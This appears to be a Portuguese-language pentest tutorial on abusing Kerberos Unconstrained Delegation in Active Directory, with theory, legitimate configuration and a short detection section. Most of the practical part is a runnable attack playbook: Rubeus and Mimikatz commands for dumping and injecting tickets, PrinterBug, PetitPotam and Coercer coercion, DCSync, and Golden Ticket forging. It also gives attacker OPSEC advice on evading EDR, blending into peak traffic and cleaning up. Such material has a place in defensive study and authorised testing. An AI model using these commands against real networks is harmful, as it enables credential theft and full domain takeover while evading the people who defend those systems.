---
layout: cyber
section: active-directory
title: "Delegação Irrestrita (Unconstrained Delegation) — Teoria, Exploração e OPSEC"
---

# Delegação Irrestrita (Unconstrained Delegation) — Teoria, Exploração e OPSEC

# O que é?

Delegação Kerberos é o mecanismo que permite a um serviço intermediário autenticar-se a outros serviços em nome de um usuário que o acessou. O problema fundamental que ela resolve é o "double-hop": quando um usuário faz login em um web server e o web server precisa acessar um banco de dados em nome desse mesmo usuário, ele não tem as credenciais do usuário para obter novos tickets Kerberos.

A Microsoft introduziu três gerações de delegação para resolver esse problema. A mais antiga — e mais perigosa — é a **Unconstrained Delegation** (também chamada de TrustedForDelegation), introduzida no **Windows 2000** como parte da implementação inicial do Kerberos no Active Directory.

**O que define Unconstrained Delegation:**
- O atributo `userAccountControl` do objeto AD contém a flag `TRUSTED_FOR_DELEGATION` (valor decimal 524288, hex 0x80000)
- Quando essa flag está presente em uma conta de computador ou usuário de serviço, o KDC envia o **TGT completo e forwardable** do usuário autenticante diretamente para o serviço
- O serviço pode usar esse TGT para se autenticar a **qualquer outro serviço da rede** em nome do usuário, sem nenhuma restrição
- Isso é fundamentalmente diferente das versões posteriores: não há lista de serviços permitidos, não há controle pelo recurso destino — é delegação irrestrita

**Por que "legado":**
O mecanismo foi projetado numa época em que a superfície de ataque era diferente e o modelo de ameaça interno era menos considerado. Hoje é tratado como funcionalidade legada com riscos de segurança bem documentados, mas permanece presente em produção porque desabilitá-lo quebra aplicações multi-tier que dependem dele.

**Onde o TGT vai:**
Diferente de um TGS (que serve apenas para um serviço específico), o TGT é a credencial raiz do usuário no domínio. Quem tem o TGT pode solicitar TGS para qualquer serviço. Armazenar o TGT de um Domain Admin em LSASS de um web server é essencialmente deixar a chave-mestra do domínio num host menos protegido.

**Distinção entre modos de delegação:**

```
Unconstrained Delegation (Windows 2000):
  Serviço recebe TGT completo → pode impersonar para QUALQUER serviço
  Flag: TRUSTED_FOR_DELEGATION (0x80000)

Constrained Delegation (Windows 2003):
  Serviço pode impersonar apenas para serviços na lista msDS-AllowedToDelegateTo
  Flag: TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)

Resource-Based Constrained Delegation (Windows 2012):
  O recurso DESTINO define quem pode delegar para ele
  Atributo: msDS-AllowedToActOnBehalfOfOtherIdentity no recurso
```

Unconstrained Delegation existe há mais de 25 anos no protocolo e ainda é encontrada em praticamente toda organização com infraestrutura Windows de médio e grande porte.

# Onde é implementado?

Unconstrained Delegation é encontrada em cenários enterprise específicos, geralmente onde aplicações multi-camada foram implantadas antes de 2003 (quando Constrained Delegation foi introduzida) ou por administradores que configuraram UD por simplicidade sem entender as implicações.

**Cenários típicos de deployment legítimo:**

**1. Servidores de aplicação web (IIS) com acesso a SQL Server:**
```
[Navegador do usuário]
    |
    | Kerberos (usuário se autentica ao IIS)
    v
[IIS / Web App — TrustedForDelegation=true]
    |
    | Kerberos com TGT do usuário
    v
[SQL Server]
    |
    | Executa query no contexto do usuário original
    v
[Resultado retorna ao usuário]
```
O IIS precisa do TGT para que o SQL Server possa aplicar permissões de linha por usuário (row-level security). Sem delegação, o SQL Server veria apenas a identidade do serviço IIS.

**2. Print Servers (servidores de impressão):**
Em muitos ambientes, o Print Server tem `TrustedForDelegation` habilitado. Isso permite que o servidor de impressão acesse recursos de rede (como spool de documentos em file shares) em nome do usuário que enviou o trabalho de impressão. Print Servers são frequentemente ignorados nas revisões de segurança porque parecem baixo risco.

**3. Servidores de backup corporativo:**
Agentes de backup que precisam percorrer file shares e acessar dados em nome de múltiplas contas de serviço podem usar UD para simplificar a configuração. Soluções legadas de backup (especialmente versões anteriores a 2010) frequentemente requerem TrustedForDelegation no servidor de backup.

**4. SharePoint (versões antigas):**
SharePoint 2007 e 2010 em muitas configurações requeriam UD nos servidores frontend para acessar SQL Server e outros backends em nome dos usuários. Ambientes que não passaram por upgrade podem ainda ter essa configuração.

**5. Servidores de aplicação em arquitetura 3-tier (Web → App → DB):**
```
[Usuário]
    |
    | Kerberos
    v
[Web Tier — pode ter UD ou CD]
    |
    | Se UD: passa TGT para App Tier
    v
[App Tier — TrustedForDelegation=true]
    |
    | Usa TGT para acessar DB
    v
[Database Tier]
```

**Onde os Domain Controllers entram:**
DCs têm `TrustedForDelegation` habilitado **por padrão** e **por design** — não é possível desabilitar em DCs sem quebrar funcionalidades fundamentais do Kerberos. Isso significa que ferramentas de enumeração sempre listam todos os DCs como tendo UD, e o atacante precisa filtrar DCs para encontrar **member servers** com UD (que são os verdadeiros alvos ofensivos).

**Escala do problema em enterprise:**
Em organizações Fortune 500, é comum encontrar dezenas ou centenas de servidores com UD habilitado, especialmente em divisões adquiridas que mantiveram infraestrutura legada. A presença de UD não indica necessariamente negligência — pode ser um requisito de aplicação documentado — mas o risco precisa ser compreendido.

# Como funciona de forma adequada?

No fluxo legítimo, Unconstrained Delegation resolve o problema de identidade em aplicações multi-tier sem expor senhas. A sequência completa é a seguinte:

**Pré-condição no Active Directory:**
```
Objeto AD do servidor (ex: WEBSRV01):
  userAccountControl = 524800
  ← 512 (normal computer account)
  + 524288 (TRUSTED_FOR_DELEGATION)
  = 524800

O bit TRUSTED_FOR_DELEGATION sinaliza ao KDC:
"Quando alguém solicitar TGS para serviços neste host,
 inclua uma cópia forwardable do TGT do solicitante."
```

**Fluxo de autenticação completo (7 passos):**

```
[1] Usuário obtém TGT
    ┌─────────┐         AS-REQ (user+pré-auth)         ┌─────┐
    │ Cliente │ ─────────────────────────────────────► │ KDC │
    │         │ ◄─────────────────────────────────────  │     │
    └─────────┘         AS-REP (TGT cifrado)            └─────┘

[2] Usuário solicita TGS para o serviço com UD
    ┌─────────┐  TGS-REQ (TGT + solicitação de          ┌─────┐
    │ Cliente │  acesso a HTTP/WEBSRV01)  ─────────────► │ KDC │
    └─────────┘                                          └─────┘

[3] KDC verifica que WEBSRV01 tem TRUSTED_FOR_DELEGATION
    KDC gera TGS especial que CONTÉM uma cópia do TGT do usuário
    (esta cópia é marcada como "forwardable")

    ┌─────────┐  TGS-REP (TGS + TGT forwardable embutido) ┌─────┐
    │ Cliente │ ◄──────────────────────────────────────────│ KDC │
    └─────────┘                                            └─────┘

[4] Usuário apresenta TGS ao WEBSRV01
    ┌─────────┐  AP-REQ (TGS + TGT embutido)  ┌──────────┐
    │ Cliente │ ──────────────────────────────►│ WEBSRV01 │
    └─────────┘                                └──────────┘

[5] WEBSRV01 extrai o TGT forwardable do usuário
    Armazena em LSASS (área Kerberos SSP)
    O TGT agora está disponível para uso pelo serviço

[6] WEBSRV01 usa o TGT para solicitar TGS para o SQL Server
    ┌──────────┐  TGS-REQ (usando TGT do usuário)  ┌─────┐
    │ WEBSRV01 │ ──────────────────────────────────►│ KDC │
    │          │ ◄──────────────────────────────────│     │
    └──────────┘  TGS-REP (TGS para SQL/SQLSRV01)  └─────┘

[7] WEBSRV01 acessa SQL Server como o usuário original
    ┌──────────┐  AP-REQ (TGS do usuário para SQL)  ┌──────────┐
    │ WEBSRV01 │ ──────────────────────────────────► │ SQLSRV01 │
    │          │                                     │          │
    └──────────┘  Dados retornam no contexto do      └──────────┘
                  usuário (row-level security aplica)
```

**O que é "forwardable":**
O flag `FORWARDABLE` em um TGT ou TGS indica que ele pode ser passado adiante para outro serviço usar. O KDC só emite TGTs forwardable dentro de TGS para serviços com UD habilitado. É uma extensão do RFC 4120 original especificada pela Microsoft.

**Configuração legítima no AD:**

```powershell
# Como um administrador habilitaria UD num servidor de aplicação
# (operação legítima, mas de alto risco)

# Via GUI: ADUC → propriedades do computador →
#   Delegation → "Trust this computer for delegation to any service (Kerberos only)"

# Via PowerShell (AD Module):
Set-ADComputer -Identity "WEBSRV01" -TrustedForDelegation $true

# Verificação do atributo resultante:
Get-ADComputer "WEBSRV01" -Properties TrustedForDelegation, userAccountControl |
    Select-Object Name, TrustedForDelegation,
        @{N='UAC_hex'; E={[Convert]::ToString($_.userAccountControl, 16)}}

# Resultado esperado:
# Name      TrustedForDelegation  UAC_hex
# WEBSRV01  True                  80600
# ← 0x80000 (TRUSTED_FOR_DELEGATION) + 0x600 (WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD)
```

**Como os TGTs ficam em LSASS:**
Quando LSASS do WEBSRV01 recebe o AP-REQ do usuário contendo o TGT embutido, o SSP Kerberos extrai e armazena esse TGT na memória do processo LSASS em estruturas de dados da `kerberos.dll`. Qualquer processo com SeDebugPrivilege (ou rodando como SYSTEM) pode ler essa memória — o que é exatamente o que Mimikatz e Rubeus fazem.

**Diferença entre computador com UD e usuário com UD:**
```
Computador com UD (mais comum):
  Qualquer autenticação Kerberos ao computador → TGT do usuário vai para LSASS
  Exemplos: web server, print server, servidor de app

Usuário de serviço com UD (mais raro):
  Conta de usuário executando um serviço
  Se o serviço aceitar conexões Kerberos, TGTs chegam igualmente
  Encontrado em: serviços legados rodando como contas de domínio com SPNs
```

**Justificativa histórica:**
O problema que UD resolve é real — aplicações multi-tier precisam impersonar usuários. A Microsoft resolveu isso de forma "simples" mas insegura no Windows 2000. A solução segura (Constrained Delegation com S4U) veio 3 anos depois, mas os servidores com UD já estavam em produção e a migração nunca foi obrigatória. Hoje, o caminho recomendado para novos deployments é sempre RBCD (Resource-Based Constrained Delegation), mas ambientes legados ainda mantêm UD por compatibilidade.

---

## Por Que Delegação Existe no Kerberos

### Kerberos e o Conceito de Delegação

O protocolo Kerberos foi projetado originalmente sem suporte a delegação. Quando um usuário autentica em um serviço web e esse serviço precisa acessar um servidor de banco de dados em nome do usuário, existe o problema: o serviço web não tem as credenciais do usuário para obter tickets adicionais.

A Microsoft introduziu três mecanismos de delegação para resolver isso:

1. **Unconstrained Delegation (UD)** — O serviço pode se passar pelo usuário para qualquer serviço na rede
2. **Constrained Delegation (CD)** — O serviço pode se passar pelo usuário apenas para serviços específicos
3. **Resource-Based Constrained Delegation (RBCD)** — Configurado no recurso destino, não na origem

### O Que Acontece no Fluxo de Autenticação com UD

Quando `TrustedForDelegation` está marcado em uma conta de computador ou usuário:

```
1. Cliente solicita TGT ao KDC (Authentication Service - AS)
2. KDC emite TGT para o cliente
3. Cliente solicita TGS para o serviço com UD (Ticket Granting Service - TGS)
   -- NESTE PASSO: o cliente inclui uma cópia FORWARDABLE do próprio TGT na requisição --
4. KDC emite TGS contendo a cópia forwardable do TGT do cliente
5. Cliente apresenta TGS ao serviço com UD
6. O serviço extrai o TGT forwardable e o armazena em LSASS
7. Com esse TGT, o serviço pode solicitar novos TGS em nome do cliente para qualquer serviço
```

A chave é o passo 3-4: o KDC inclui o TGT do cliente dentro do TGS quando o serviço de destino tem UD habilitado. Isso é chamado de "delegation info" dentro do TGS.

### Onde os TGTs Ficam Armazenados

No servidor com UD, os TGTs delegados ficam no processo **LSASS** (Local Security Authority Subsystem Service), especificamente na área de memória gerenciada pelo SSP Kerberos. Qualquer processo com privilégios de `SeDebugPrivilege` ou `SYSTEM` pode ler essa memória e extrair os tickets.

Isso significa que:
- Cada vez que alguém se autentica no serviço (acesso a share, RDP, etc.), o TGT fica em LSASS
- Se o servidor raramente reinicia, podem existir dezenas de TGTs de usuários diferentes
- Domain Controllers também se autenticam em outros hosts (replicação, GPO, etc.) — se um DC se autentica no servidor com UD, o TGT do DC estará lá

### Flag UAC Envolvida

O atributo `userAccountControl` do objeto Active Directory contém a flag `TRUSTED_FOR_DELEGATION` (valor decimal 524288, hexadecimal 0x80000). Quando presente, indica que a conta tem UD habilitada.

Para contas de computador (machine accounts), o bit relevante é o mesmo. DCs têm essa flag por design e por isso aparecem em consultas de UD.

### Diferença Entre UD em Computadores vs Usuários

- **Computadores com UD**: Cenário mais comum. Quando qualquer usuário autentica via Kerberos em um serviço rodando nesse computador, o TGT do usuário é armazenado.
- **Usuários com UD**: Raro. Conta de usuário executando um serviço com UD. Mais difícil de encontrar, mas igualmente perigoso.

---

## Na Prática

### Fase 1: Comprometer um Servidor com UD

Para explorar UD, você precisa de:
1. Execução de código com privilégios SYSTEM (ou SeDebugPrivilege) no servidor com UD
2. Identificar quais tickets estão na memória ou coagir autenticação de alvos de alto valor

Vetores de comprometimento comuns para o servidor com UD:
- Web application exploits (o servidor frequentemente é um web server)
- Service account com senha fraca via Kerberoasting
- Vulnerabilidade no serviço que roda com UD
- Movimento lateral a partir de credencial já comprometida

### Fase 2: Identificar Alvos com UD

Antes de comprometer, durante reconhecimento:

**PowerView (PowerShell no host Windows do atacante ou victim):**
```powershell
# Todos os computadores com Unconstrained Delegation (exceto DCs que também têm)
Get-DomainComputer -Unconstrained | Select-Object dnshostname, useraccountcontrol

# Filtrando explicitamente DCs para encontrar member servers com UD
Get-DomainComputer -Unconstrained | Where-Object {$_.primarygroupid -ne "516"} | Select-Object dnshostname, operatingsystem

# Contas de usuário com UD (mais raro)
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, useraccountcontrol

# Com credenciais alternativas (runas alternativo)
Get-DomainComputer -Unconstrained -Credential $cred -Server DC.domain.com
```

**Active Directory Module (nativo do Windows, requer RSAT):**
```powershell
Import-Module ActiveDirectory

# Computadores com UD
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, OperatingSystem | Select-Object Name, TrustedForDelegation, OperatingSystem

# Usuários com UD
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object SamAccountName, TrustedForDelegation
```

**LDAP direto (funciona de qualquer lugar com acesso LDAP ao DC):**
```
# Filter: userAccountControl com bit 524288 (TRUSTED_FOR_DELEGATION)
Filter LDAP: (userAccountControl:1.2.840.113556.1.4.803:=524288)

# Com ldapsearch no Linux:
ldapsearch -x -H ldap://DC_IP -D "domain\user" -w "password" \
  -b "DC=domain,DC=com" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  dn userAccountControl

# Com Python/ldap3:
from ldap3 import Server, Connection, ALL
s = Server('DC_IP', get_info=ALL)
c = Connection(s, 'domain\\user', 'password', auto_bind=True)
c.search('DC=domain,DC=com', 
         '(userAccountControl:1.2.840.113556.1.4.803:=524288)',
         attributes=['cn', 'userAccountControl', 'dNSHostName'])
```

**BloodHound queries:**
```cypher
-- Computadores com Unconstrained Delegation (excluindo DCs - primarygroupid 516)
MATCH (c:Computer {unconstraineddelegation:true}) 
WHERE c.primarygroupid <> "516"
RETURN c.name, c.operatingsystem

-- Caminho mais curto de usuário qualquer até computador com UD
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {unconstraineddelegation:true}))
WHERE c.primarygroupid <> "516"
RETURN p

-- Quem tem sessão ativa em computadores com UD
MATCH (u:User)-[:HasSession]->(c:Computer {unconstraineddelegation:true})
WHERE c.primarygroupid <> "516"
RETURN u.name, c.name
```

**enum4linux-ng (Linux, sem credenciais de domínio completas):**
```bash
enum4linux-ng -A DC_IP 2>/dev/null | grep -i delegation
```

---

## Exemplos de Código / Comandos

### Extração de Tickets Existentes em LSASS

Após comprometer o servidor com UD e obter SYSTEM:

**Com Rubeus (preferido — mais furtivo que Mimikatz em alguns ambientes):**
```cmd
# Listar todos os tickets Kerberos presentes em LSASS
Rubeus.exe triage

# Output esperado:
# Action: Triage
# [*] Current LUID: 0x3e7
# -----------------------------------------------------------------------------------
# | LUID     | UserName            | Service         | EndTime              |
# -----------------------------------------------------------------------------------
# | 0x462a4  | administrator @ DOM | krbtgt/DOMAIN   | 5/1/2026 2:00:00 PM  |
# | 0x3e4    | WEBSERVER$ @ DOM    | krbtgt/DOMAIN   | 5/1/2026 2:00:00 PM  |
# -----------------------------------------------------------------------------------

# Extrair ticket específico pelo LUID (use /nowrap para base64 sem quebras)
Rubeus.exe dump /luid:0x462a4 /nowrap

# Extrair todos os tickets
Rubeus.exe dump /nowrap

# Extrair apenas TGTs (mais interesse operacional)
Rubeus.exe dump /service:krbtgt /nowrap
```

**Com Mimikatz:**
```
# Exportar todos os tickets para arquivos .kirbi no diretório atual
mimikatz# sekurlsa::tickets /export

# Listar tickets sem exportar
mimikatz# sekurlsa::tickets

# Exportar para arquivo específico
mimikatz# kerberos::list /export
```

**Injetar o ticket capturado (Pass-the-Ticket):**
```cmd
# Com Rubeus (base64 do ticket)
Rubeus.exe ptt /ticket:doIFuj[...]AQEBAAAA==

# Com Mimikatz (.kirbi file)
mimikatz# kerberos::ptt C:\tickets\administrator@krbtgt-DOMAIN.COM.kirbi

# Verificar que ticket foi injetado
klist

# Testar acesso
dir \\DC.domain.com\c$
```

### Coerção de Autenticação — PrinterBug (MS-RPRN)

O PrinterBug abusa do protocolo MS-RPRN (Print System Remote Protocol). A função `RpcRemoteFindFirstPrinterChangeNotificationEx` aceita um parâmetro que especifica para onde notificações devem ser enviadas. Qualquer usuário de domínio autenticado pode chamar essa função e forçar o servidor (incluindo DCs) a se autenticar no host do atacante.

**Pré-requisito**: Spooler Service deve estar rodando no DC alvo (padrão em versões antigas do Windows Server; desabilitado por padrão em Windows Server 2019+ após patches)

**Verificar se Spooler está rodando no DC:**
```powershell
# Do Windows:
Get-Service -ComputerName DC.domain.com -Name Spooler

# Do Linux (sem credenciais, via RPC):
rpcclient -U "domain/user%password" DC_IP -c "enumdrivers"
# Se retornar drivers, spooler está ativo

# Com Impacket:
python3 rpcdump.py domain/user:password@DC_IP | grep -i spooler
```

**Executar SpoolSample (Windows — requer .NET):**
```cmd
# Sintaxe: SpoolSample.exe <DC_alvo> <host_com_UD_do_atacante>
SpoolSample.exe DC01.domain.com WEBSERVER.domain.com

# Resultado: DC01$ vai tentar autenticar em WEBSERVER via SMB/Kerberos
# Se Rubeus monitor estiver rodando em WEBSERVER, captura o TGT do DC01$
```

**PrinterBug via Impacket (Linux — requer Python):**
```bash
# Instalar Impacket se necessário
pip3 install impacket

# Executar printerbug
python3 /opt/impacket/examples/printerbug.py domain/user:password@DC_IP WEBSERVER_IP

# Com hash NTLM (pass-the-hash):
python3 printerbug.py -hashes :NTLMHASH domain/user@DC_IP WEBSERVER_IP
```

### Coerção de Autenticação — PetitPotam (MS-EFSRPC)

PetitPotam abusa do protocolo MS-EFSRPC (Encrypting File System Remote Protocol). É mais moderno e funciona mesmo quando o Spooler está desabilitado. A função `EfsRpcOpenFileRaw` pode ser chamada para forçar autenticação.

**Importante**: versões patched do Windows bloqueiam uso sem autenticação. Em redes modernas, frequentemente é necessário ser usuário autenticado.

```bash
# Clonar repositório
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam

# Autenticado (usuário de domínio qualquer):
python3 PetitPotam.py -u user -p password -d domain.com WEBSERVER_IP DC_IP

# Com hash NTLM:
python3 PetitPotam.py -u user -hashes :NTLMHASH -d domain.com WEBSERVER_IP DC_IP

# Sem autenticação (em DCs não patched):
python3 PetitPotam.py WEBSERVER_IP DC_IP
```

**Alternativa — DFSCoerce (MS-DFSNM):**
```bash
git clone https://github.com/ly4k/DFSCoerce.git
python3 dfscoerce.py -u user -p password -d domain.com WEBSERVER_IP DC_IP
```

**Alternativa — Coercer (framework unificado de coerção):**
```bash
pip3 install coercer
# Lista e testa múltiplos vetores de coerção automaticamente
coercer coerce -u user -p password -d domain.com -l WEBSERVER_IP -t DC_IP --always-continue
```

### Monitorar TGTs Chegando com Rubeus Monitor

Este comando deve ser executado NO servidor com UD ANTES de coagir o DC:

```cmd
# Monitorar novos tickets a cada 5 segundos, output base64 sem quebras
Rubeus.exe monitor /interval:5 /nowrap

# Monitorar filtrando apenas TGTs (excluir TGSes)
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$

# Output quando DC01$ autenticar:
# [*] 5/1/2026 2:30:00 AM UTC - Found new TGT:
#   User                  :  DC01$@DOMAIN.COM
#   StartTime             :  5/1/2026 2:30:00 AM
#   EndTime               :  5/1/2026 12:30:00 PM
#   RenewTill             :  5/8/2026 2:30:00 AM
#   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
#   Base64EncodedTicket   :
#   doIFjDCCBYigAwIBBaEDAgEWooIEpj[...]
```

### Fluxo Completo de Ataque: UD + Coerção + DCSync

**Cenário**: WEBSERVER.domain.com tem Unconstrained Delegation. Atacante já tem SYSTEM em WEBSERVER.

```
ETAPA 1: Em WEBSERVER (sessão SYSTEM)
=========================================================
# Iniciar monitoramento de tickets
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$

ETAPA 2: De qualquer host do atacante com acesso à rede
=========================================================
# Coagir DC01 a autenticar em WEBSERVER (PrinterBug)
SpoolSample.exe DC01.domain.com WEBSERVER.domain.com
# OU
python3 PetitPotam.py -u lowuser -p Password123 -d domain.com WEBSERVER_IP DC01_IP

ETAPA 3: Em WEBSERVER — Rubeus monitor captura o TGT do DC01$
=========================================================
# Copiar o base64 do TGT exibido pelo Rubeus monitor

ETAPA 4: Injetar TGT do DC01$ na sessão atual
=========================================================
Rubeus.exe ptt /ticket:doIFjDCCBYigAwIBBaEDAgEWooIEpj[...]

ETAPA 5: DCSync com o TGT do DC01$ injetado
=========================================================
# Mimikatz DCSync (extrai hashes do AD via replicação)
mimikatz# lsadump::dcsync /domain:domain.com /user:krbtgt
mimikatz# lsadump::dcsync /domain:domain.com /user:Administrator
mimikatz# lsadump::dcsync /domain:domain.com /all /csv

# Impacket secretsdump (alternativa Linux)
# Após converter ticket para ccache:
[Convert]::FromBase64String("doIFjD[...]") | Set-Content -Path "dc01.kirbi" -Encoding Byte
# No Linux:
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=/tmp/dc01.ccache
secretsdump.py -k -no-pass domain/DC01$@DC01.domain.com

ETAPA 6: Golden Ticket com krbtgt hash extraído
=========================================================
# Hash krbtgt obtido no DCSync
mimikatz# kerberos::golden /user:FakeAdmin /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# Verificar acesso total ao domínio
dir \\DC01.domain.com\c$
PsExec.exe \\DC01.domain.com cmd.exe
```

### Converter e Usar Tickets entre Windows e Linux

```powershell
# Windows: Base64 -> .kirbi
$base64 = "doIFjDCCBYig[...]"
[System.Convert]::FromBase64String($base64) | Set-Content -Path "ticket.kirbi" -Encoding Byte

# Linux: .kirbi -> .ccache (com Impacket)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/tmp/ticket.ccache

# Usar com ferramentas Impacket
secretsdump.py -k -no-pass domain/Administrator@DC.domain.com
wmiexec.py -k -no-pass domain/Administrator@TARGET.domain.com
smbexec.py -k -no-pass domain/Administrator@TARGET.domain.com
psexec.py -k -no-pass domain/Administrator@TARGET.domain.com

# Linux: .ccache -> .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

## Detecção e OPSEC

### O Que os Defensores Veem

**Evento 4768 (Kerberos Authentication Service — AS-REQ/AS-REP):**
- Ocorre quando usuário (ou DC) obtém novo TGT
- Campos relevantes: Account Name, Client Address
- Anomalia: DC obtendo TGT sendo originiado de IP diferente do próprio DC

**Evento 4769 (Kerberos Service Ticket Operations — TGS-REQ/TGS-REP):**
- Ocorre quando serviço solicita TGS
- Anomalia: conta de DC$ solicitando TGS para hosts incomuns

**Evento 4648 (A logon was attempted using explicit credentials):**
- Pode indicar tentativa de autenticação forçada

**Evento 4634/4647 (Logoff):**
- Ausência de logoff após logon suspeito

**Detectar PrinterBug/PetitPotam:**
- Evento 5145: Network share object was checked for access — requisições para PIPE\spoolss
- Evento 4688: Process creation com spoolss.dll como stack trace incomum
- Tráfego de rede: conexões SMB origindo de DCs para outros hosts da rede
- Network IDS: assinaturas para MS-RPRN e MS-EFSRPC calls anômalas

### Técnicas de OPSEC para o Atacante

**Antes de executar:**
- Verificar se AV/EDR está ativo no servidor com UD (processo de Rubeus pode ser detectado)
- Preferir executar Rubeus via injeção ou reflective loading em vez de soltar binário em disco
- Usar Cobalt Strike `execute-assembly` para rodar Rubeus na memória

**Durante extração de tickets:**
```cmd
# Evitar dump completo de LSASS (muito barulhento)
# Preferir: Rubeus dump por LUID específico
Rubeus.exe dump /luid:0x462a4 /service:krbtgt /nowrap

# Em vez de:
# Mimikatz sekurlsa::logonpasswords (despeja toda a memória LSASS)
```

**Coerção de autenticação:**
- PrinterBug gera mais logs do que PetitPotam em ambientes modernos
- Usar coerção uma única vez — múltiplas tentativas aumentam visibilidade
- Executar durante horário de pico (entre 8h-17h) para se misturar ao tráfego legítimo
- Usar conta de usuário de baixo privilégio para coerção (não admin) — mais difícil de correlacionar

**DCSync:**
- DCSync gera evento 4662 (An operation was performed on an object) com propriedade de replicação
- Replicar apenas a conta necessária (`/user:krbtgt`) em vez de `/all`
- Usar de um host que já tenha comunicação legítima com o DC
- Horário: executar no início da manhã quando replicação legítima também ocorre

**Limpeza após o ataque:**
```cmd
# Remover tickets injetados da sessão atual
klist purge

# Matar processo Rubeus monitor se necessário
# (prefira terminar graciosamente antes de encerrar sessão)
```

**Detecção de UD por defensores — como dificultar:**
- O fato do servidor ter UD não é visível para ferramentas de detecção em runtime
- A presença dos tickets em LSASS é o principal IoC — evitar deixar tickets por longos períodos
- Correlação de IPs: coerção vindoura de IP incomum é detectável — usar IP de host já comprometido

### Assinaturas YARA / Sigma para Defensores

```yaml
# Sigma rule: Detecção de PrinterBug/SpoolSample
title: Forced Authentication via MS-RPRN SpoolSample
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4648
        LogonType: 3
    condition: selection
    filter_legitimate:
        SubjectUserName|endswith: '$'  # machine account
        # Adicionar lógica para baseline de autenticações legítimas
```

---

## Módulos Relacionados

`06_delegacao_constrained_e_rbcd.md` cobre Constrained Delegation e RBCD como alternativas quando UD não está disponível. `07_forest_e_domain_trusts.md` aprofunda como usar TGT do DC pra comprometer trusts cross-forest. `08_bloodhound_e_enumeracao.md` fornece queries pra encontrar caminhos até hosts com UD. `02_kerberoasting_e_asrep.md` é relevante porque service account com UD que tem SPN pode ser Kerberoasted antes de comprometer o host (e AS-REP Roasting se pré-auth estiver desabilitada). `08_movimentacao_lateral/05_ntlm_relay_attacks.md` cobre coerção via NTLM relay como alternativa.

### Ferramentas Relevantes

| Ferramenta | Função | Plataforma |
|---|---|---|
| Rubeus | Manipulação de tickets Kerberos | Windows |
| Mimikatz | Dump de credenciais e tickets | Windows |
| SpoolSample | PrinterBug via MS-RPRN | Windows |
| PetitPotam | Coerção via MS-EFSRPC | Windows/Linux |
| Coercer | Framework unificado de coerção | Linux (Python) |
| Impacket printerbug.py | PrinterBug via Python | Linux |
| impacket secretsdump.py | DCSync e dump remoto | Linux |
| impacket ticketConverter | Conversão kirbi/ccache | Linux |
| BloodHound/SharpHound | Enumeração e grafos de ataque | Windows/Linux |
| PowerView | Enumeração PowerShell de AD | Windows |

### Referências Externas

- Microsoft MSDN — Kerberos Constrained Delegation Overview
- Sean Metcalf (adsecurity.org) — "Active Directory Security Risk #101: Kerberos Unconstrained Delegation"
- Elad Shamir — "Wagging the Dog: Abusing Resource-Based Constrained Delegation"
- DirkJan Mollema — "I'm bringing relaying back: A comprehensive guide on relaying anno 2022"
- MITRE ATT&CK T1558.001 — Golden Ticket
- Lee Christensen / Will Schroeder — SpoolSample original research
- topotam — PetitPotam research e PoC
